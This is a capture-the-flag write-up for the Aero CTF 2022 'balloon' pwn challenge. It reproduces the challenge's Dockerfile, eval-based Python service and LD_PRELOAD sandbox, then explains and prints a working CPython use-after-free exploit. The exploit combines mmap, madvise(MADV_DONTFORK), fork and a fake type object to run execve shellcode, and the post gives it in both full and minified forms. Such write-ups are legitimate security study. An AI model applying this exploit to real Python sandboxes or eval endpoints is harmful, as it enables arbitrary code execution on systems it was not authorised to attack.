+++
title = 'Aero CTF 2022 — balloon'
date = 2022-07-31T00:00:00+03:00
tags = ['ctf', 'writeup', 'pwn']
toc = true
+++

## Files

**Dockerfile**:

```Dockerfile
FROM python:3.11-rc-slim AS builder

RUN for name in 'ctypes' 'pickle' 'test' 'cffi'; do \
        find /usr/local/lib/python3.11/ -name "*${name}*" -exec rm -rf '{}' '+'; \
    done

FROM alpine:3.16.1

RUN apk add coreutils

COPY --from=builder /lib/x86_64-linux-gnu /chroot/lib/x86_64-linux-gnu
COPY --from=builder /lib64/ld-linux-x86-64.so.2 /chroot/lib64/ld-linux-x86-64.so.2
COPY --from=builder /usr/lib/x86_64-linux-gnu /chroot/usr/lib/x86_64-linux-gnu
COPY --from=builder /usr/local/lib/python3.11 /chroot/usr/local/lib/python3.11
COPY --from=builder /usr/local/lib/libpython3.11.so.1.0 /chroot/usr/lib/libpython3.11.so.1.0

COPY --from=builder /usr/local/bin/python3.11 /chroot/bin/

COPY preload.so balloon.py flag /chroot/challenge/

RUN chmod 111 /chroot/challenge/flag \
    && chmod 555 /chroot/challenge/preload.so \
    && chmod 444 /chroot/challenge/balloon.py

COPY entrypoint.sh /tmp/entrypoint.sh

RUN chmod 555 /tmp/entrypoint.sh

ENTRYPOINT [ "/tmp/entrypoint.sh" ]
```

**entrypoint.sh**:

```sh
#!/bin/sh

export LD_PRELOAD=/challenge/preload.so

chroot --userspec=1000:1000 /chroot \
    /bin/python3.11 -u /challenge/balloon.py
```

**balloon.py**:

```python
#!/usr/bin/env python3

import os


VERY_NICE = 1337


def execute(payload: str) -> object:
    try:
        return eval(payload)
    except Exception as e:
        return f'[-] {e}'


def main() -> None:
    os.nice(VERY_NICE)

    os.write(1, b'[*] Please, input a payload:\n> ')
    payload = os.read(0, 512).decode()

    os.close(0)

    result = execute(payload)
    print(result)

    os._exit(0)


if __name__ == '__main__':
    main()
```

**preload.c**:

```c
__attribute__((visibility ("hidden"))) void forbidden() {
    write(1, "[-] Security check failed :(\n", 29);

    asm (
        "mov $0x3c, %rax;"
        "syscall;"
    );
}

__attribute__((visibility ("hidden"))) void replace_obj(void *ptr, int size) {
    for (int i = 2; i < size / sizeof(unsigned long long); i++) {
        ((unsigned long long *)(ptr))[i] = &forbidden;
    }
}

void syscall(int number) {
    if (number != 0xba) {
        forbidden();
    }

    asm (
        "mov $0xba, %rax;"
        "syscall;"
    );
}

void system() {
    forbidden();
}

void execve() {
    forbidden();
}

void fexecve() {
    forbidden();
}

void execveat() {
    forbidden();
}

void execl() {
    forbidden();
}

void execlp() {
    forbidden();
}

void execle() {
    forbidden();
}

void execv() {
    forbidden();
}

void execvp() {
    forbidden();
}

void execvpe() {
    forbidden();
}

void nice() {
    unsigned long long python_base = &syscall - 0x79319a + 0x1c5000;

    // io.BufferedReader
    replace_obj(python_base + 0x5531a0, 0x1a8);
    // io.BufferedWriter
    replace_obj(python_base + 0x552e60, 0x1a8);
    // memoryview
    replace_obj(python_base + 0x559a80, 0x1a8);
    // bytearray
    replace_obj(python_base + 0x560c20, 0x1a8);

    write(1, "[*] Security check initialized\n", 31);

    asm (
        "mov $1, %rax;"
    );
}
```

## Overview

We need to bypass python's memory checks and do memory corruption.

There are some existing bugs in cpython that works on the latest version:

- [https://github.com/python/cpython/issues/91153](https://github.com/python/cpython/issues/91153) (will be fixed in Python 3.12)

- [https://github.com/python/cpython/issues/60198](https://github.com/python/cpython/issues/60198), here is a [public exploit](https://pwn.win/2022/05/11/python-buffered-reader.html)

The author tried to fix these bugs by removing `memoryview`, `bytearray`, `io.BufferedReader` and `io.BufferedWriter` objects.

## Solution

The intended solution is based on [mmap](https://man7.org/linux/man-pages/man2/mmap.2.html) and [madvise](https://man7.org/linux/man-pages/man2/madvise.2.html) syscalls. There are a useful parameter for `madvise()`:

```
MADV_DONTFORK (since Linux 2.6.16)
        Do not make the pages in this range available to the child
        after a fork(2).  This is useful to prevent copy-on-write
        semantics from changing the physical location of a page if
        the parent writes to it after a fork(2).  (Such page
        relocations cause problems for hardware that DMAs into the
        page.)
```

It means that if we've set MADV_DONTFORK on a page, this page will not be copied to fork. How to use this?

1. Create a page using `mmap.mmap()`, call `madvise(MADV_DONTFORK)` on this page.

2. Call `os.fork()`. The page will not exists in child, but the object containing the pointer will be copied. So we have got a bad pointer `ptr` in child.

3. Allocate a very long list `list` in child, for example 0x1000 elements. The existing Python's heap are too small for this, so the allocator will call `mmap()` to get more space. The address of a new page will be the same as `ptr`.

4. So `list` and `ptr` point to the same memory, this is use-after-free vulnerability.

5. Create a fake object type with custom `repr()` function that contains a payload. Then create an instance `obj` of this object.

6. Add `obj` to `list` using `ptr`. Then call `repr(list)`.

Example solution:

```python
import os
import time
import mmap

page = mmap.mmap(-1, 0x1000 * 16)
page.madvise(mmap.MADV_DONTFORK)

serialize = lambda x: b''.join(y.to_bytes(8, 'little') for y in x)

if os.fork():
    time.sleep(1)
else:
    array = [0] * 4096 * 25
    page_ptr = id(array) - 0x110940

    obj_type = serialize(
        [
            2, id(type),
            0, id(b'') + 32,
            33, 1,
        ] + [page_ptr] * 32
    )

    obj = serialize(
        [
            2, id(obj_type) + 32,
            0, 1,
        ]
    )

    page[:8] = serialize([id(obj) + 32])

    path = b'/challenge/flag'
    path_ptr = serialize([id(path) + 32])

    # a tiny execve shellcode using `path_ptr` in rdi
    shellcode = b'\x48\x31\xC0\xB0\x3B\x48\xBF' + path_ptr + b'\x48\x31\xF6\x48\x31\xD2\x48\x31\xC9\x0F\x05'
    
    rwx_page = mmap.mmap(-1, 0x1000 * 8, prot = 7)
    rwx_page.write(b'\x90' * 0x1000 * 8)
    rwx_page[-len(shellcode):] = shellcode

    str(a)
```

The challenge limits input's length, so the actual solution is minified.

Example minified solution: 

```python
[0 if p.madvise(10)else(i('time').sleep(1)if i('os').fork()else exec(r"s=lambda x:b''.join(y.to_bytes(8,'little')for y in x);a=[0]*4096*25;t=s([2,id(type),0,id(b'')+32,33,1]+[id(a)-0x110940]*32);o=s([2,id(t)+32,0,1]);p[:8]=s([id(o)+32]);e=b'/challenge/flag';c=b'\x48\x31\xC0\xB0\x3B\x48\xBF'+s([id(e)+32])+b'\x48\x31\xF6\x48\x31\xD2\x48\x31\xC9\x0F\x05';w=i('mmap').mmap(-1,0x8000,prot=7);w.write(b'\x90'*0x8000);w[-len(c):]=c;str(a)"))for i in[__import__]for p in[i('mmap').mmap(-1,0x1000*16)]]
```

# Flag

```
Aero{RCE_1n_Pyth0n_1s_d4NG3r0uS_ev3Ry_t1m3}
```
